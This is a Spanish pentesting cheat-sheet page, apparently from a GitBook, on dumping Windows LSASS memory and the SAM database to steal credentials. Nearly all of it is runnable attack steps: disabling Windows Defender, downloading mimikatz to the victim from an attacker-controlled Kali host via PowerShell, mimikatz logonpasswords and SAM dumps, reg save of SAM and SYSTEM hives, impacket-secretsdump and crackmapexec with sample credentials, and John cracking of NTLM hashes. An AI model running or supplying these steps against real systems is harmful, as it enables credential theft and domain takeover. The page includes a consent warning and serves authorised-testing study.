
# Volcado de LSASS y SAM

LSASS es el proceso de seguridad de Windows que se encarga de la autenticación de usuario y de la gestión de contraseñas. SAM (Security Accounts Manager) es la base de datos de Windows que almacena las contraseñas de usuario y otros datos de seguridad.

En un ataque de volcado de LSASS y SAM, un atacante obtiene acceso a un sistema Windows y utiliza una herramienta de dumping de memoria para extraer el contenido de la memoria del proceso LSASS. Esto incluye las contraseñas de usuario en forma cifrada.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Volcado de lsass y SAM en Windows</mark>

Sirve para encontrar usuarios con sus contraseñas que tengan permisos de administración del dominio

### Volcado de lsass con Mimikatz&#x20;

{% hint style="warning" %}
Necesitamos permisos de admin en el equipo
{% endhint %}

* Desactivar windows defender en tiempo real
* Descargar [mimikatz.exe](https://github.com/gentilkiwi/mimikatz) de Github en nuestro equipo de atacante
* `python3 -m http-server`
* En Windows de empleado:&#x20;

```powershell
(New-Object System.NET.WebClient).DownloadFile("http://{IP DE KALI}/mimikatz.exe","mimikatz.exe")
```

```powershell
.\mimikatz.exe
sekurlsa::logonpasswords
```

### Dump de lsass desde el admin de tareas

* Administrador de tareas > Detalles > lsass.exe > `crear archivo de volcado`

### Crackear con John los hashes NTLM

```
john --format=NT admin.hash
```

### Volcado de SAM con Mimikatz

{% hint style="warning" %}
Necesitamos ser system
{% endhint %}

{% code title="En Mimikatz" %}

```
privilege::debug
token::elevate
lsadump::sam
```

{% endcode %}

## <mark style="color:purple;">Volcado de lsass y SAM en Linux</mark>

### Volcado de SAM en local&#x20;

{% code title="Windows de empleado" %}

```
cd desktop
reg save hklm\sam sam.save
reg save hklm\system system.save

Mover archivos a Kali
Impacket-secretsdump -sam sam.save -system system.save LOCAL
```

{% endcode %}

### Volcado desde Kali Linux

```
impacket-secretsdump empleado1:Passw0rd2@IPWINDOWS
crackmapexec smb IPWINDOWS -u empleado1 -p “Passw0rd2” —sam
```
